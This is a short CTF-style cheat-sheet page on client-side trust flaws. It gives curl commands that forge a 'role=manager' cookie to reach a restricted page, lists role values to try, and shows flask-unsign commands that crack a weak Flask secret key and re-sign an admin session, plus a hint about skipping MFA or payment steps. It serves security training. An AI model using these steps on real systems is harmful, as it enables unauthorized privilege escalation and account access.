# Client-side trust: cookies, hidden fields, JS checks (CWE-602, CWE-565)

**Signs**: after login you get a readable cookie (`role=employee`, `admin=false`, `user=bob`,
`level=1`), or a form has `<input type="hidden" name="role" value="user">`, or the UI hides a
button with JS. Hint "your browser alone decides", "edit the lock's note".

## Exploit
```bash
# 1. log in normally, list cookies
curl -si -c jar -d 'username=employee&password=employee123' $T/login | grep -i set-cookie
# 2. the privileged page refuses you
curl -s -b jar $T/manager -o /dev/null -w '%{http_code}\n'      # 403
# 3. flip the value (keep the real session cookie!)
curl -s -b "session=$(grep session jar | awk '{print $7}'); role=manager" $T/manager | grep -o 'flag{[^}]*}'
```
Browser: DevTools → Application → Cookies → edit → reload.

Values to try: `admin`, `manager`, `administrator`, `root`, `staff`, `true`, `1`, `0` (inverted
logic), other user ids/names. Encoded values: base64-decode, edit, re-encode
(`echo -n 'role=admin' | base64`). Hidden fields / JSON bodies: change them in Burp Repeater.

## Signed framework cookies
Not editable without the key — but often **readable**:
- Flask `session=eyJ...` (no dots-only): `flask-unsign --decode --cookie '<value>'`.
  Weak `SECRET_KEY`? `flask-unsign --unsign --cookie '<v>' --wordlist wordlists/secrets/flask-secret-keys.txt`
  then `flask-unsign --sign --cookie "{'role':'admin'}" --secret '<key>'`.
- Express `s%3A<value>.<sig>` (cookie-signature), Rails `_session` (encrypted), Django signed cookies.
- JWT → [jwt](jwt.md).

## Other client-controlled decisions
- Price/quantity/user_id in POST bodies, `isAdmin` in JSON → [mass-assignment](../04-access-control/mass-assignment.md)
- Multi-step flows: request step 3 directly, skipping step 2 (MFA, payment).

Seen in: `auth4` (ExpenseFlow: `role=employee` → `role=manager` on `/manager`).
